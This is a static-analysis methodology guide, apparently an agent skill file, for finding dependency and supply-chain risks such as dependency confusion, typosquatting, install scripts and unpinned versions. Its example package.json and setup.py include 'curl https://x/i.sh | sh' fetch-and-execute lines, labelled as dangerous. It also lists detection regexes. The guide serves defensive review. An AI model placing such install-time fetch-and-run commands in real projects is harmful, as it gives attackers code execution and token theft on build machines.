---
name: dependency-and-supply-chain
description: >-
  SAST detection methodology for dependency and supply-chain risk (CWE-1104,
  CWE-1357, CWE-829, CWE-427), covering known-vulnerable components, dependency
  confusion, typosquatting, malicious install/lifecycle scripts, missing or
  ignored lockfiles and integrity hashes, unpinned/latest versions, direct
  git/URL/tarball deps, private-registry fallback to public, base-image and
  GitHub-Action supply chain, and unsafe module search order. Use when reviewing
  package.json/lockfiles, requirements.txt/poetry.lock, pom.xml, .npmrc, or
  pip.conf. Writes confirmed findings to findings/37-dependency-and-supply-chain.md.
---

# Dependency & Supply-Chain — SAST Methodology

**Class:** Dependency & Supply-Chain · **CWE-1104 / CWE-1357 / CWE-829 / CWE-427** · **OWASP:** A06 Vulnerable and Outdated Components (and A08 Software & Data Integrity Failures)
**Findings file:** `findings/37-dependency-and-supply-chain.md`

## 1. Overview

Every dependency is code you execute with your application's privileges, sourced
from a registry you don't control. Supply-chain risk is about **what you pull,
from where, how it's resolved, and whether it can change under you**. Failure
families: (1) *known-vulnerable components* — you depend on a version with a
published CVE; (2) *resolution hijack* — the package manager can be steered to a
package or version an attacker controls (dependency confusion, typosquatting,
registry-priority/fallback bugs, unpinned ranges); (3) *execution on install* —
lifecycle scripts (`postinstall`, `setup.py`) run arbitrary code the moment you
install; (4) *integrity gaps* — no lockfile or hashes, so what you tested isn't
what ships. The core tests: is any dependency known-vulnerable, can its identity
or version be changed by someone outside your trust boundary, and does installing
it execute code?

## 2. Where it lives

- **Node/npm/yarn/pnpm:** `package.json`, `package-lock.json`, `yarn.lock`,
  `pnpm-lock.yaml`, `.npmrc`, `.yarnrc`/`.yarnrc.yml`.
- **Python:** `requirements*.txt`, `pyproject.toml`, `poetry.lock`, `Pipfile`/
  `Pipfile.lock`, `setup.py`/`setup.cfg`, `pip.conf`/`pip.ini`, `constraints.txt`.
- **Java/JVM:** `pom.xml`, `build.gradle`(`.kts`), `settings.gradle`,
  `gradle.lockfile`, `~/.m2/settings.xml` (repository order/mirrors).
- **Others:** Go `go.mod`/`go.sum`, Ruby `Gemfile`/`Gemfile.lock`, PHP
  `composer.json`/`composer.lock`, Rust `Cargo.toml`/`Cargo.lock`, `.NET`
  `*.csproj`/`packages.lock.json`/`nuget.config`.
- **Container/CI supply chain:** `Dockerfile` base images, `.github/workflows/*`
  `uses:` action pins (cross-reference the cicd-and-pipeline-injection skill).
- **Registry config anywhere:** scope→registry mappings, `NODE_PATH`/`PYTHONPATH`,
  Maven `<repositories>`/mirror order.

## 3. Sources (tainted input)

The "source" is anything **outside your trust boundary that can determine what
code gets installed**:

- The **public registry namespace**: an unclaimed name matching your internal
  package (dependency confusion), a typo-neighbor of a popular package
  (typosquatting), or a maintainer account/token that gets compromised.
- **Version ranges** (`^`, `~`, `*`, `latest`, `>=`) that let a *new* (possibly
  malicious) release satisfy your spec on the next install.
- **Direct git/URL/tarball dependencies** pointing at a mutable ref (`#main`, a
  moving tag, an http URL) an attacker can alter or MITM.
- **Registry resolution order / fallback**: a private package that can be served
  by the public registry because priority or scoping is misconfigured.
- **Transitive dependencies** — the vast majority of your code; a compromise deep
  in the tree still runs on install/at runtime.
- **Lifecycle-script contents** of any dependency (they execute at install time).
- **Environment**: `PYTHONPATH`/`NODE_PATH`/`sys.path` entries and the current
  working directory that change which module actually loads.

## 4. Sinks (dangerous operations)

```json
// package.json — DANGEROUS: unpinned ranges, install script, unscoped internal name, git/url dep
{
  "name": "internal-billing-utils",          // if also unclaimed on public npm → dependency confusion
  "dependencies": {
    "lodash": "^4.0.0",                       // range: a new release auto-satisfies on install
    "express": "latest",                      // whatever is newest at install time
    "left-pad": "*",                          // any version
    "some-lib": "git+https://ex.com/x.git#main",   // mutable git ref, no integrity
    "vuln-lib": "https://ex.com/a.tgz"        // arbitrary tarball URL, no hash
  },
  "scripts": {
    "preinstall": "node ./scripts/fetch.js",  // runs arbitrary code on `npm install`
    "postinstall": "curl https://x/i.sh | sh" // classic install-time RCE vector
  }
}
```
```ini
# .npmrc — DANGEROUS: default registry + scope that can fall through to public
registry=https://registry.npmjs.org/          # internal @acme packages resolve here if unscoped
# missing: @acme:registry=https://npm.acme-internal/  → dependency confusion window
//registry.npmjs.org/:_authToken=${NPM_TOKEN}  # token in file if committed
```
```python
# requirements.txt — DANGEROUS: unpinned, no hashes, extra public index, direct URL
requests                                       # unpinned → newest at install
flask>=1.0                                      # range
django @ https://ex.com/django.tar.gz          # direct URL, unverified
--extra-index-url https://pypi.org/simple       # public fallback for internal names → confusion
# no --require-hashes → integrity not enforced
```
```python
# setup.py — DANGEROUS: arbitrary code executed at install time
from setuptools import setup
import os; os.system("curl https://x/i.sh | sh")   # runs during `pip install`
setup(name="thing", version="1.0")
```
```xml
<!-- pom.xml / settings.xml — DANGEROUS: version range + public repo ordered before internal -->
<dependency><groupId>com.acme</groupId><artifactId>lib</artifactId>
  <version>[1.0,)</version></dependency>          <!-- open range -->
<repositories>
  <repository><id>central</id><url>https://repo1.maven.org/maven2</url></repository>
  <repository><id>internal</id><url>https://nexus.acme/</url></repository>  <!-- public wins first-match -->
</repositories>
```
```dockerfile
# Dockerfile — DANGEROUS: unpinned base image (supply-chain mutable)
FROM node:latest                                # tag can be re-pointed; not reproducible/verifiable
```

Dangerous patterns: a dependency version with a known CVE; internal package names
also resolvable from a public registry; typo-neighbors of popular packages;
`preinstall`/`postinstall`/`prepare`/`install` scripts and `setup.py` code;
missing lockfile or `--require-hashes`/`integrity`; `^`/`~`/`*`/`latest`/open
ranges; git/URL/tarball deps at mutable refs; `--extra-index-url`/public-before-
private repo order; unpinned base images and `uses: action@tag`; `PYTHONPATH`/
`NODE_PATH` or leading `.`/empty path entries that let a local file shadow a
trusted module.

## 5. Sanitizers / safe patterns

**Safe:**
- **SCA gate:** scan every dependency (including transitive) against advisory
  databases (`npm audit`, `pip-audit`, `osv-scanner`, OWASP Dependency-Check,
  Trivy, GitHub Dependabot); fail the build on known-vulnerable versions.
- **Pin exactly + lock:** commit the lockfile and install with the locked,
  integrity-checked graph (`npm ci`, `pip install --require-hashes`,
  `poetry install` with `poetry.lock`, Gradle lockfiles, `go.sum`). Exact versions,
  not ranges, for anything security-sensitive.
- **Scope internal packages** and bind the scope to your private registry
  (`@acme:registry=...`); do **not** add a public `--extra-index-url` fallback for
  names that exist internally. Prefer a single virtual registry (Artifactory/Nexus)
  that proxies public and blocks name-shadowing.
- **Disable lifecycle scripts** on install where feasible (`npm ci --ignore-scripts`,
  `pip install --no-build-isolation` with vetted wheels; prefer prebuilt wheels
  over `setup.py`). Vet any package that requires install scripts.
- **Pin by digest/SHA:** base images by `@sha256:...`, GitHub Actions by full
  commit SHA, git deps by full commit hash (never a branch/moving tag).
- **Verify provenance:** signatures/attestations (Sigstore/cosign, npm provenance,
  SLSA), publish scoped internal packages with a claimed public placeholder to
  block confusion.
- **Deterministic module resolution:** avoid mutating `PYTHONPATH`/`NODE_PATH`;
  don't run from an untrusted CWD; ensure the standard library / trusted packages
  can't be shadowed by a local file.

**Fails / not a real mitigation:**
- A lockfile that exists but is **ignored at install** (`npm install` re-resolving
  ranges instead of `npm ci`, or CI that regenerates it) — you still float.
- Pinning your **direct** deps while transitive deps float, or trusting a pin
  without integrity hashes (a re-published same-version tarball changes content).
- Scoping the private registry but leaving a public `--extra-index-url`/mirror that
  first-match or highest-version resolution can still hit (pip picks the highest
  version across *all* indexes — public can win even when scoped).
- `--ignore-scripts` in CI but not on developer machines (where the malicious
  install already ran and stole tokens).
- "We reviewed it once" — the next release under a range is unreviewed; the risk
  is the *update*, not the current pinned state.
- Typosquat "protection" by eyeballing names — homoglyphs and near-misses
  (`reqests`, `python-dateutil` vs `dateutil`, `crossenv` vs `cross-env`) slip past.
- A base image pinned by tag (`:3.19`) rather than digest — tags are mutable.

## 6. Detection methodology

1. **Inventory manifests, lockfiles, and registry config.**
   ```
   rg -l 'dependencies|devDependencies' -g 'package.json'
   rg -l . -g 'package-lock.json' -g 'yarn.lock' -g 'pnpm-lock.yaml' -g 'poetry.lock' -g 'Pipfile.lock' -g 'go.sum' -g 'Gemfile.lock' -g 'composer.lock'
   rg -l . -g '.npmrc' -g 'pip.conf' -g 'pip.ini' -g 'nuget.config' -g 'settings.xml'
   ```
   A manifest with **no committed lockfile** is itself a finding.
2. **Unpinned / range versions.**
   ```
   rg -n '":\s*"[\^~*]|":\s*"latest"|":\s*">=?' package.json
   rg -n '^[A-Za-z0-9_.-]+\s*$|>=|~=|,\s*<|==\*' requirements.txt      # names with no ==, or ranges
   rg -n '<version>\[|<version>\(|LATEST|RELEASE' pom.xml
   ```
3. **Install / lifecycle scripts.**
   ```
   rg -n '"(pre|post)?install"\s*:|"prepare"\s*:|"prepublish' package.json
   rg -n 'os\.system|subprocess|check_call|urlopen|exec\(|compile\(' setup.py
   ```
4. **Dependency-confusion surface.** List internal/scoped names and check registry
   binding and public fallback.
   ```
   rg -n '"@[^/]+/|"name"\s*:' package.json          # scopes / internal names
   rg -n '--extra-index-url|--index-url|extra-index-url' requirements.txt pip.conf
   rg -n '@[^:]+:registry=|^registry=' .npmrc
   ```
   Then confirm each internal name is claimed on / not resolvable from the public
   registry, and that scope→registry mappings exist.
5. **Direct git/URL/tarball deps.**
   ```
   rg -n 'git\+|https?://[^"]+\.(tgz|tar\.gz|whl|zip)|#(main|master|develop)"' package.json requirements.txt
   ```
6. **Typosquatting / suspicious names:** eyeball the dependency list for
   near-misses of popular packages, brand-new/low-download packages, and
   maintainer changes; cross-check against an SCA/OSV feed.
7. **Container & CI supply chain.**
   ```
   rg -n 'FROM\s+\S+:latest|FROM\s+[^@]+$' Dockerfile*
   rg -n 'uses:\s*[^@]+@(v?\d|main|master)\b' .github/workflows
   ```
8. **Module search order.**
   ```
   rg -n 'sys\.path\.(insert|append)|PYTHONPATH|NODE_PATH|require\(\s*["'\'']\.' .
   ```
9. **Run an SCA scan** (`osv-scanner`, `npm audit`, `pip-audit`, Trivy) for the
   known-vulnerable dimension and reconcile with the manifest findings.

## 7. Modern & niche variants

- **Known-vulnerable dependencies (SCA):** a pinned version carrying a published
  CVE (RCE/deserialization/prototype-pollution/path-traversal in the library).
  Severity is inherited from the vulnerable component and its reachability in your
  code — a vulnerable function you never call is lower risk than one on a request
  path.
- **Dependency confusion:** an internal package name (`internal-billing-utils`,
  `@acme/…` without a bound registry) that is **unclaimed on the public registry**;
  the resolver, preferring the highest version or a public index, pulls the
  attacker's public package instead of yours — install-time RCE inside your build/
  CI. Root causes: unscoped internal names, missing scope→registry mapping,
  `--extra-index-url` to public, and public-before-private repo order.
- **Typosquatting:** a malicious package named a keystroke away from a popular one
  (`crossenv`/`cross-env`, `python3-dateutil`, `electron-native-notify`); a typo
  in the manifest installs and executes it. Homoglyph and scope-confusion variants
  included.
- **Malicious install / lifecycle scripts:** npm `preinstall`/`postinstall`/
  `prepare`, Python `setup.py`/PEP 517 build hooks, Ruby gem extensions — arbitrary
  code the instant you `install`, before any of your tests run; the standard
  delivery mechanism for confusion/typosquat payloads (token/secret exfiltration).
- **Missing / ignored lockfile & integrity hashes:** without a committed lockfile
  and hash-enforced install, "what you tested" and "what ships" diverge; a
  re-published tarball or a floated transitive dep silently changes the running
  code. `npm install` (vs `npm ci`) and `pip install` without `--require-hashes`
  reintroduce float even when a lockfile exists.
- **Unpinned / `^` / `latest` versions:** the update itself is the attack surface;
  a range lets the next (compromised) release in automatically. The 2024
  maintainer-account-takeover pattern relies on victims floating within a range.
- **Direct git/URL/tarball deps:** deps at `#main`, a moving tag, or an `http` URL
  are mutable and un-hashed — the source can change or be MITM'd between installs.
- **Private-registry fallback to public:** the highest-version-wins behavior of
  pip across multiple indexes, or npm's public default for unscoped names, lets a
  public package outrank the intended private one — the mechanism behind dependency
  confusion even when a private registry exists.
- **Base-image & GitHub-Action supply chain:** `FROM image:latest` and
  `uses: org/action@tag` trust a mutable pointer; a re-pointed tag ships new code
  into your image/pipeline (cross-reference cicd-and-pipeline-injection). Pin by
  digest/SHA.
- **Unsafe `PYTHONPATH` / module search order (CWE-427):** a mutated
  `sys.path`/`PYTHONPATH`/`NODE_PATH`, a leading empty/`.` entry, or running from an
  attacker-writable CWD lets a local file **shadow** a trusted/stdlib module —
  arbitrary code loaded under a trusted name without touching the registry at all.

## 8. Common false positives

- A range spec that a **committed lockfile pins** and CI installs with `npm ci`/
  `--require-hashes` (the effective version is locked and integrity-checked).
- `postinstall` scripts in your **own** first-party package doing legitimate build
  work (compile/codegen), not fetching remote code.
- Internal names that are **scoped and bound** to a private registry with no public
  fallback, or already defensively claimed on the public registry.
- A flagged CVE in a dependency whose vulnerable code path is provably unreachable
  from the application (note it, but rate reachability).
- `--extra-index-url` pointing at another **trusted internal** index only.
- Base image pinned by digest even though a human-readable tag also appears.

## 9. Severity & exploitability

Base **High**; **Critical** when installation or resolution yields code execution
in your build/CI/runtime — a confirmed dependency-confusion window, a typosquat/
malicious-lifecycle-script path, or a known-vulnerable component with a reachable
RCE/deserialization sink. Raise for reachable pre-auth or CI-executing contexts
(build servers hold the crown-jewel tokens). Lower to **Medium/Low** when the
vulnerable code path is unreachable, the floating range is fully pinned by an
enforced lockfile, or the risk is a not-yet-realized update window on a trusted
internal package. A known-vulnerable component inherits the severity of its own
CVE, adjusted by reachability. See `references/severity-model.md`.

## 10. Remediation

Gate every build on an SCA scan and fail on known-vulnerable versions. Commit
lockfiles and install with the locked, hash-verified graph (`npm ci`,
`--require-hashes`, `poetry install`, Gradle/Go lockfiles). Pin exact versions;
scope internal packages to a private registry and remove public fallbacks —
prefer a single proxying virtual registry that blocks name-shadowing, and
defensively claim internal names publicly. Disable/scrutinize install lifecycle
scripts, prefer prebuilt wheels, and pin base images by digest and Actions by
commit SHA. Avoid mutating module search paths and never run installs from an
untrusted CWD. Verify provenance/signatures where available.

## 11. Output

Append each confirmed finding to **`findings/37-dependency-and-supply-chain.md`**
using `references/finding-template.md`. Set `Class: Dependency & Supply-Chain` and
`CWE: CWE-1104` (unmaintained/known-vuln third-party), `CWE-1357` (reliance on
insufficiently trustworthy component), `CWE-829` (inclusion from an untrusted
control sphere — confusion/typosquat/URL deps), or `CWE-427` (uncontrolled search
path) as fits. In **Chain potential** name primitives such as *install-time /
build code execution* (→ RCE in CI/dev, often terminal, and provides *secret/token
exfiltration* from the build environment), *runtime RCE via a vulnerable component*
(→ consumes reachability from application code), and *trusted-name shadowing*
(confusion/`PYTHONPATH` → provides code execution under a trusted identity). Note
when it *consumes* a primitive such as a compromised maintainer account or a
mutable base-image/Action tag from the cicd-and-pipeline-injection skill.

**Primitives (controlled):** provides `CODE_EXEC`,`SECRET_LEAK`; consumes none

## References
- OWASP A06:2021 Vulnerable and Outdated Components; A08:2021 Software & Data
  Integrity Failures; CWE-1104, CWE-1357, CWE-829, CWE-427; OWASP Dependency-Check;
  OSV/OSV-Scanner; SLSA supply-chain framework; Sigstore/npm provenance; Alex
  Birsan "Dependency Confusion" research.
